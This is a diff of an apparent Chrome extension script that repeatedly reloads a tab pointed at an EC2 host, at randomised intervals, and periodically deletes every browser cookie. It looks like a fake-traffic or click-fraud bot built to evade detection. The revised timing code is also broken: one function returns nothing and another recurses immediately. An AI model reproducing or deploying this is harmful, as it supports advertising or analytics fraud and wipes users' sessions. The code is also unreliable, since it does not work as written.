@@ -7,7 +7,7 @@ function determine_url_from(cookie) {
 }
 
 function random_uri() {
-  return "http://www.elmundodigital.net?xyz"
+  return "http://ec2-54-81-216-13.compute-1.amazonaws.com"
 }
 
 
@@ -29,27 +29,37 @@ chrome.windows.onCreated.addListener(function(w) {
         var counter     = 0
         var page_visits = Math.floor((Math.random()*6)+2)
 
-        // set random user agent 
+        // set random user agents 
 
-        setInterval(function() {
+        // set random timeout
+        random_timeout = function() {
+          Math.floor((Math.random()*90)+30) * 1000
+        }
+        reload_tab = function(next_timeout) {
 
-          // if we have iterated 7 times, or this is the first
-          // instance, then 
-          if (counter++ % page_visits === 0) {
-            chrome.cookies.getAll({}, function(cookies) {
-              for(var i = 0; i < cookies.length; i++) {
-                chrome.cookies.remove({
-                  url:  determine_url_from(cookies[i]),
-                  name: cookies[i].name
-                
-                }, function(details) { })
-              }
-            })           
-          }
+          setTimeout(function() {
+            // if we have iterated 7 times, or this is the first
+            // instance, then 
+            if (counter++ % page_visits === 0) {
+              chrome.cookies.getAll({}, function(cookies) {
+                for(var i = 0; i < cookies.length; i++) {
+                  chrome.cookies.remove({
+                    url:  determine_url_from(cookies[i]),
+                    name: cookies[i].name
+                  
+                  }, function(details) { })
+                }
+              })           
+            }
 
-          chrome.tabs.reload(tab_id, { }, function() { })
+            chrome.tabs.reload(tab_id, { }, function() { })
 
-        }, 10000)
+            setTimeout(random_timeout(), reload_tab())
+
+          }, next_timeout) 
+        }
+
+        reload_tab(random_timeout())
       }
       f(w.tabs[0].id)
 
